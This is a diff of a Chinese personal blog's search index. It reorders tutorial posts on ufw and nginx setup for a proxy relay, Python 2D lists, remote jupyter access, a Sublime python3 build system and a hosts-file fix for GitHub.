+<h4 id="防火墙配置"><a href="#防火墙配置" class="headerlink" title="防火墙配置"></a>防火墙配置</h4><p>这里使用的是ubuntu的防火墙<code>ufw</code>。<br>ufw命令举例：<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-comment"># 允许某个端口连接</span></span><br><span class="line">ufw allow port</span><br><span class="line"><span class="hljs-comment"># 允许此IP访问所有的本机端口</span></span><br><span class="line">ufw allow from IPv4</span><br><span class="line"><span class="hljs-comment"># 开启防火墙</span></span><br><span class="line">ufw <span class="hljs-built_in">enable</span></span><br></pre></td></tr></table></figure><br>经过上述配置后，GFW探测你的VPS，除了ssh和网站的常用端口外，ss/ssr的端口根本无法连接，IP地址的被墙的几率自然就降低了。</p>
+<h4 id="将境外VPS伪装的更像一个网站"><a href="#将境外VPS伪装的更像一个网站" class="headerlink" title="将境外VPS伪装的更像一个网站"></a>将境外VPS伪装的更像一个网站</h4><p>为了把境外VPS做的更像一个网站，因此我们在这台服务器上再放一些web页面。<br>同样的安装nginx<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">apt install nginx</span><br></pre></td></tr></table></figure><br>nginx安装完成的时候会自动启动，打开浏览器输入你服务器的IP地址，你会看到如下的界面。<br><img src="/2020/02/04/network-jump/4.jpg" alt="Welcome"><br>nginx的默认目录在<code>/var/www/html/</code><br>我们将静态页面放到这里面就可以了，一定要有个index.html哦。<br>因为我的博客repo在我的github上，因此我就直接git clone到上面这个目录下了。<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-built_in">cd</span> /var/www/html/</span><br><span class="line">git <span class="hljs-built_in">clone</span> https://github.com/aestheticisma/aestheticisma.github.io</span><br><span class="line"><span class="hljs-comment"># 之后将aestheticisma.github.io里面的东西全部移动到/var/www/html/下</span></span><br><span class="line"><span class="hljs-built_in">cd</span> aestheticisma.github.io/</span><br><span class="line">cp -r ./* ..</span><br></pre></td></tr></table></figure><br>再次在浏览器输入服务器ip地址就会发现有东西显示了。<br>这样我们的境外VPS伪装完成了。</p>
+<h3 id="四、关于自己机器上的代理配置说明"><a href="#四、关于自己机器上的代理配置说明" class="headerlink" title="四、关于自己机器上的代理配置说明"></a>四、关于自己机器上的代理配置说明</h3><p>如果你之前用过shadowsocks诸如此类代理软件，就是相当于把ip地址和端口号换成了国内服务器的ip地址和在nginx中配置的监听端口号，其他的密码等都是和之前一样的，因为代理服务还是配置在境外VPS上的，国内的服务器只是起到了一个转发流量的作用。</p>
 ]]></content>
       <categories>
         <category>Daily Essays</category>
@@ -770,6 +757,19 @@
       </categories>
   </entry>
   <entry>
+    <title>Python中如何定义二维数组</title>
+    <url>/2019/11/17/py-cre-douarr/</url>
+    <content><![CDATA[<p>小知识点随手记录…<a id="more"></a></p>
+<h3 id="Numpy"><a href="#Numpy" class="headerlink" title="Numpy"></a>Numpy</h3><p>或许你会说用numpy中的数组不就可以了，想定义几维就几维，没错numpy确实方便很多。<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> numpy</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>a = numpy.zeros((<span class="hljs-number">2</span>,<span class="hljs-number">3</span>))</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>a</span><br><span class="line">array([[<span class="hljs-number">0.</span>, <span class="hljs-number">0.</span>, <span class="hljs-number">0.</span>],</span><br><span class="line">       [<span class="hljs-number">0.</span>, <span class="hljs-number">0.</span>, <span class="hljs-number">0.</span>]])</span><br></pre></td></tr></table></figure><br>但如果不用numpy呢？</p>
+<h3 id="List"><a href="#List" class="headerlink" title="List"></a>List</h3><p>有人会说可以定义一个二维列表代替二维数组呗。</p>
+<h4 id="1-错误方式"><a href="#1-错误方式" class="headerlink" title="1. 错误方式"></a>1. 错误方式</h4><p>一开始一定会有人这样定义<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>a = [[<span class="hljs-number">0</span>]*<span class="hljs-number">3</span>]*<span class="hljs-number">2</span></span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>a</span><br><span class="line">[[<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]]</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><br>看是不是成功了，但当我们修改其中的某个值的时候，就会发现奇怪的地方<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>a[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = <span class="hljs-number">1</span></span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>a</span><br><span class="line">[[<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]]</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><br>特么的怎么连<code>a[1][0]</code>也跟着变成1了，因为上面的定义方式等价于：<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>temp_list = [<span class="hljs-number">0</span>] * <span class="hljs-number">3</span></span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>a = [temp_list, temp_list]</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>a</span><br><span class="line">[[<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]]</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>temp_list[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span></span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>temp_list</span><br><span class="line">[<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>a</span><br><span class="line">[[<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]]</span><br></pre></td></tr></table></figure><br>所以这么用list定义二维数组的方法是错的，那么正确的方式应该怎么做呢？</p>
+<h4 id="2-正确方式"><a href="#2-正确方式" class="headerlink" title="2. 正确方式"></a>2. 正确方式</h4><p>我们可以用for来定义二维数组。<br><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>arra = [ [<span class="hljs-number">0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">3</span>)] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">2</span>)]</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>arra</span><br><span class="line">[[<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]]</span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>arra[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = <span class="hljs-number">1</span></span><br><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>arra</span><br><span class="line">[[<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>], [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]]</span><br></pre></td></tr></table></figure><br>可以看到这样做就没有上面的错误出现了。</p>
+]]></content>
+      <categories>
+        <category>Daily Essays</category>
+      </categories>
+  </entry>
+  <entry>
     <title>服务器配置jupyter notebook实现远程访问</title>
     <url>/2019/12/14/remote-jupyternotebook/</url>
     <content><![CDATA[<p><code>jupyter notebook</code>简单配置，随手记录，以备遗忘。<a id="more"></a><br>最近开始想从头系统的学习一下深度学习，以便为以后三年的研究生的学习生活打基础，顺便将之前租的阿里云服务器利用起来，于是就配置一下<code>jupyter notebook</code>吧</p>
@@ -779,26 +779,6 @@
 <h4 id="3-修改配置文件"><a href="#3-修改配置文件" class="headerlink" title="3. 修改配置文件"></a>3. 修改配置文件</h4><p><figure class="highlight python hljs"><table><tr><td class="code"><pre><span class="line">c.NotebookApp.ip=<span class="hljs-string">'*'</span>    <span class="hljs-comment">#允许访问的IP地址，设置为*代表允许任何客户端访问</span></span><br><span class="line">c.NotebookApp.password = <span class="hljs-string">u'sha1:8d...'</span><span class="hljs-comment">#		刚才生成密码时复制的密文</span></span><br><span class="line">c.NotebookApp.open_browser = <span class="hljs-literal">False</span>    <span class="hljs-comment">#True的话会自动弹出窗口</span></span><br><span class="line">c.NotebookApp.port = <span class="hljs-number">5555</span>  <span class="hljs-comment">#可自行指定一个端口, 访问时使用该端口</span></span><br><span class="line">c.NotebookApp.allow_remote_access = <span class="hljs-literal">True</span>   <span class="hljs-comment">#这个一定得设置，不然会报错</span></span><br></pre></td></tr></table></figure><br>别忘了保存。<br>哦，如果你是国内的服务器厂商诸如腾讯云、阿里云之类的，还需要添加一下安全组规则。</p>
 <h3 id="三、远程访问"><a href="#三、远程访问" class="headerlink" title="三、远程访问"></a>三、远程访问</h3><p>在服务器输入：<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">jupyter notebook</span><br></pre></td></tr></table></figure><br>就可以开启<code>jupyter notebook</code>进程了<br>如果访问的是/root目录，还需要root权限<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">jupyter notebook --allow-root</span><br></pre></td></tr></table></figure><br>之后就可以在本地浏览器输入<code>ip:port</code>实现远程访问<code>jupyter notebook</code>了<br>（第一次访问会输入密码。）</p>
 <h3 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h3><p>我们可以使用<code>screen</code>命令实现<code>jupyter notebook</code>后台运行，这样我们去用服务器干别的事情啦。<br>输入：<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">screen -S process_name</span><br></pre></td></tr></table></figure><br>之后运行<code>jupyter notebook</code>就可以了，返回键为<code>ctrl</code> + <code>A</code> + <code>D</code><br>显示后台程序输入：<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">screen -r process_name</span><br></pre></td></tr></table></figure><br>如果服务器没有<code>screen</code>命令请安装<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">apt install screen</span><br></pre></td></tr></table></figure></p>
-]]></content>
-      <categories>
-        <category>Daily Essays</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>Sublime中按ctrl+B调用python3运行</title>
-    <url>/2019/07/23/sublime-run/</url>
-    <content><![CDATA[<p>前些天用python写了一个小程序，但放在sublime里直接ctrl+B运行不了，提示没有什么什么包…思前想后，觉得sublime的ctrl+B快捷键默认使用的是电脑里的python2吧<a id="more"></a>，而我是用pip3 install的包，肯定会报错了，那现在解决办法一定是要让sublime知道我的python3放在哪里，根据python3的路径去用python3执行代码。</p>
-<p>解决办法如下：</p>
-<h5 id="1-首先新建一个sublime-build-system"><a href="#1-首先新建一个sublime-build-system" class="headerlink" title="1. 首先新建一个sublime build system"></a>1. 首先新建一个sublime build system</h5><p>   Tools-&gt;Build System-&gt;New Build System…</p>
-<p>   <img src="/2019/07/23/sublime-run/sublime_run1.png" alt="sublime_run1"></p>
-<h5 id="2-在里面输入以下内容："><a href="#2-在里面输入以下内容：" class="headerlink" title="2. 在里面输入以下内容："></a>2. 在里面输入以下内容：</h5><p>   <figure class="highlight json hljs"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="hljs-attr">"env"</span>: &#123;<span class="hljs-attr">"PYTHONIOENCODING"</span>: <span class="hljs-string">"utf8"</span>&#125;,</span><br><span class="line">    <span class="hljs-attr">"cmd"</span>: [<span class="hljs-string">"/Library/Frameworks/Python.framework/Versions/3.6/bin/python3"</span>, <span class="hljs-string">"-u"</span>, <span class="hljs-string">"$file"</span>],</span><br><span class="line">    <span class="hljs-attr">"file_regex"</span>: <span class="hljs-string">"^[ ]*File \"(...*?)\", line ([0-9]*)"</span>,</span><br><span class="line">    <span class="hljs-attr">"selector"</span>: <span class="hljs-string">"source.python"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>   <code>&quot;env&quot;: {“PYTHONIOENCODING”: “utf8”}</code>的作用是为了避免中文报错。</p>
-<p>   <code>[&quot;/Library/Frameworks/Python.framework/Versions/3.6/bin/python3&quot;, &quot;-u&quot;, &quot;$file&quot;]</code>这里的路径替换成python3的路径。</p>
-<p>   如果你不知道python3的路径在哪里，mac os请在终端输入which python3查看:</p>
-<p>   <figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-built_in">which</span> python3</span><br></pre></td></tr></table></figure></p>
-<p>   比如我的路径是<code>/usr/local/bin/python3</code>，就将该路径复制过去。</p>
-<p>   然后保存文件名为<strong>python3.sublime-build</strong></p>
-<p>   最后，选择python3: Tools-&gt;Build System-&gt;python3</p>
 ]]></content>
       <categories>
         <category>Daily Essays</category>
@@ -824,23 +804,20 @@
       </categories>
   </entry>
   <entry>
-    <title>Solve无法访问github的问题</title>
-    <url>/2020/02/04/unable-access-github/</url>
-    <content><![CDATA[<p>前几天发现家里的网络访问不了github了，开始没太在意，因为挂着代理也能访问不影响，直到今天准备push的时候发现根本push不上去。现将解决方法整理如下。<a id="more"></a></p>
-<h3 id="一、访问github-IP查询网址"><a href="#一、访问github-IP查询网址" class="headerlink" title="一、访问github IP查询网址"></a>一、访问github IP查询网址</h3><p><a href="http://www.github.com.ipaddress.com/" target="_blank" rel="noopener">Click Here</a><br>你会看到如下界面<br><img src="/2020/02/04/unable-access-github/1.jpg" alt="1.jpg"></p>
-<h3 id="二、修改Hosts文件"><a href="#二、修改Hosts文件" class="headerlink" title="二、修改Hosts文件"></a>二、修改Hosts文件</h3><ul>
-<li><p>Mac<br>位置：<code>/etc/hosts</code></p>
-</li>
-<li><p>Win<br>位置：<code>C:\Windows\system32\drivers\etc</code></p>
-</li>
-</ul>
-<p>添加在IP查询页面看到的IP地址：<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">192.30.253.113	github.com</span><br></pre></td></tr></table></figure></p>
-<h3 id="三、刷新DNS缓存"><a href="#三、刷新DNS缓存" class="headerlink" title="三、刷新DNS缓存"></a>三、刷新DNS缓存</h3><ul>
-<li><p>Mac<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">sudo dscacheutil -flushcache</span><br></pre></td></tr></table></figure></p>
-</li>
-<li><p>Win<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">ipconfig/flushdns</span><br></pre></td></tr></table></figure></p>
-</li>
-</ul>
+    <title>Sublime中按ctrl+B调用python3运行</title>
+    <url>/2019/07/23/sublime-run/</url>
+    <content><![CDATA[<p>前些天用python写了一个小程序，但放在sublime里直接ctrl+B运行不了，提示没有什么什么包…思前想后，觉得sublime的ctrl+B快捷键默认使用的是电脑里的python2吧<a id="more"></a>，而我是用pip3 install的包，肯定会报错了，那现在解决办法一定是要让sublime知道我的python3放在哪里，根据python3的路径去用python3执行代码。</p>
+<p>解决办法如下：</p>
+<h5 id="1-首先新建一个sublime-build-system"><a href="#1-首先新建一个sublime-build-system" class="headerlink" title="1. 首先新建一个sublime build system"></a>1. 首先新建一个sublime build system</h5><p>   Tools-&gt;Build System-&gt;New Build System…</p>
+<p>   <img src="/2019/07/23/sublime-run/sublime_run1.png" alt="sublime_run1"></p>
+<h5 id="2-在里面输入以下内容："><a href="#2-在里面输入以下内容：" class="headerlink" title="2. 在里面输入以下内容："></a>2. 在里面输入以下内容：</h5><p>   <figure class="highlight json hljs"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="hljs-attr">"env"</span>: &#123;<span class="hljs-attr">"PYTHONIOENCODING"</span>: <span class="hljs-string">"utf8"</span>&#125;,</span><br><span class="line">    <span class="hljs-attr">"cmd"</span>: [<span class="hljs-string">"/Library/Frameworks/Python.framework/Versions/3.6/bin/python3"</span>, <span class="hljs-string">"-u"</span>, <span class="hljs-string">"$file"</span>],</span><br><span class="line">    <span class="hljs-attr">"file_regex"</span>: <span class="hljs-string">"^[ ]*File \"(...*?)\", line ([0-9]*)"</span>,</span><br><span class="line">    <span class="hljs-attr">"selector"</span>: <span class="hljs-string">"source.python"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>   <code>&quot;env&quot;: {“PYTHONIOENCODING”: “utf8”}</code>的作用是为了避免中文报错。</p>
+<p>   <code>[&quot;/Library/Frameworks/Python.framework/Versions/3.6/bin/python3&quot;, &quot;-u&quot;, &quot;$file&quot;]</code>这里的路径替换成python3的路径。</p>
+<p>   如果你不知道python3的路径在哪里，mac os请在终端输入which python3查看:</p>
+<p>   <figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-built_in">which</span> python3</span><br></pre></td></tr></table></figure></p>
+<p>   比如我的路径是<code>/usr/local/bin/python3</code>，就将该路径复制过去。</p>
+<p>   然后保存文件名为<strong>python3.sublime-build</strong></p>
+<p>   最后，选择python3: Tools-&gt;Build System-&gt;python3</p>
 ]]></content>
       <categories>
         <category>Daily Essays</category>
@@ -1320,6 +1297,29 @@
 ]]></content>
       <categories>
         <category>LeetCode系列</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Solve无法访问github的问题</title>
+    <url>/2020/02/04/unable-access-github/</url>
+    <content><![CDATA[<p>前几天发现家里的网络访问不了github了，开始没太在意，因为挂着代理也能访问不影响，直到今天准备push的时候发现根本push不上去。现将解决方法整理如下。<a id="more"></a></p>
+<h3 id="一、访问github-IP查询网址"><a href="#一、访问github-IP查询网址" class="headerlink" title="一、访问github IP查询网址"></a>一、访问github IP查询网址</h3><p><a href="http://www.github.com.ipaddress.com/" target="_blank" rel="noopener">Click Here</a><br>你会看到如下界面<br><img src="/2020/02/04/unable-access-github/1.jpg" alt="1.jpg"></p>
+<h3 id="二、修改Hosts文件"><a href="#二、修改Hosts文件" class="headerlink" title="二、修改Hosts文件"></a>二、修改Hosts文件</h3><ul>
+<li><p>Mac<br>位置：<code>/etc/hosts</code></p>
+</li>
+<li><p>Win<br>位置：<code>C:\Windows\system32\drivers\etc</code></p>
+</li>
+</ul>
+<p>添加在IP查询页面看到的IP地址：<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">192.30.253.113	github.com</span><br></pre></td></tr></table></figure></p>
+<h3 id="三、刷新DNS缓存"><a href="#三、刷新DNS缓存" class="headerlink" title="三、刷新DNS缓存"></a>三、刷新DNS缓存</h3><ul>
+<li><p>Mac<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">sudo dscacheutil -flushcache</span><br></pre></td></tr></table></figure></p>
+</li>
+<li><p>Win<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">ipconfig/flushdns</span><br></pre></td></tr></table></figure></p>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>Daily Essays</category>
       </categories>
   </entry>
 </search>
